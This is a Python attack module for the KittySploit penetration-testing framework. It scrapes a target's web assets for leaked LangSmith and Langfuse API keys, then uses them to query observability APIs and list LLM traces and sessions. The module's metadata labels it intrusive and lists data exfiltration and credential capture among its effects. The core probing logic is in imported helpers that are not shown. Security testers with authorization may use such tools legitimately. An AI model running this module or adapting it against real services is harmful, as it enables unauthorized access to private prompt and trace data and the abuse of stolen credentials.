#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Abuse leaked LangSmith and Langfuse API keys to access traces and sessions."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.langsmith_langfuse_probe import enumerate_llm_observability
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "LangSmith / Langfuse Key Abuse",
        "description": (
            "Uses leaked LangSmith (lsv2_*) or Langfuse (lf_pk_/lf_sk_*) keys to "
            "query observability APIs for traces and sessions. Auto-discovers from bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["langsmith", "langfuse", "llm", "observability", "enumeration", "auxiliary"],
        "modules": [
            "scanner/http/langfuse_detect",
            "scanner/http/langsmith_detect",
            "scanner/http/vibe_stack_secrets_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.1,
            "noise": 0.3,
            "value": 1.3,
        },
    }

    langsmith_api_key = OptString("", "LangSmith API key (lsv2_pt_… / lsv2_sk_…)", False)
    langfuse_public_key = OptString("", "Langfuse public key (lf_pk_…)", False)
    langfuse_secret_key = OptString("", "Langfuse secret key (lf_sk_…)", False)
    langfuse_host = OptString("", "Langfuse host (https://cloud.langfuse.com)", False)
    auto_discover = OptBool(True, "Scrape target assets for LangSmith/Langfuse keys", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        verify = self._to_bool(self.verify_ssl)

        findings, creds = enumerate_llm_observability(
            self.session,
            homepage,
            verify_ssl=verify,
            langsmith_key=str(self.langsmith_api_key or "").strip(),
            langfuse_public=str(self.langfuse_public_key or "").strip(),
            langfuse_secret=str(self.langfuse_secret_key or "").strip(),
            langfuse_host=str(self.langfuse_host or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No LangSmith/Langfuse API access (set options or enable auto_discover)")
            return False

        for hit in ok:
            platform = hit.get("platform")
            if platform == "langsmith":
                print_success(f"LangSmith: accessible — {hit.get('endpoint')}")
            elif platform == "langfuse":
                print_success(f"Langfuse: {hit.get('trace_count', 0)} trace(s) accessible")

        self.set_info(
            severity="critical",
            reason=f"LLM observability enum: {', '.join(sorted({str(h.get('platform')) for h in ok}))}",
            findings=findings,
            credentials={k: mask_secret(v) if "key" in k else v for k, v in creds.items()},
        )
        return True
